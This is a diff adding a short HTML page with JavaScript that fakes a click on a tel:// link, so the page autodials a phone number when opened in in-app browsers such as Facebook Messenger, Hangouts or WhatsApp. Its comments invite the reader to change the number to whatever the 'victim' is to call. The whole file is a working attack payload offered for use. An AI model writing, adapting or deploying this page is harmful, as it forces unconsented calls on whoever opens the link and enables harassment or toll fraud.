@@ -1,0 +1,12 @@
+<!-- The top id=target line will fail if it is not loaded in a trusted app. The javascript should autodial the number when it is loaded in something like Facebook messenger, Google Hangouts, WhatsApp and the like. Autodailing in iMessage does not work in the newest IOS rev. -->
+
+<a id="target" href="tel://9007726533">click me</a>
+<script>
+var target = document.getElementById("target");
+var fakeEvent = document.createEvent("MouseEvents");
+fakeEvent.initEvent("click", true, false);
+target.dispatchEvent(fakeEvent);
+</script>
+
+
+<!-- Basically, just change the number to what you want the victim to call. Shouts to Eddie Van Halen and Sammy Hagar for the phone number ;) -->
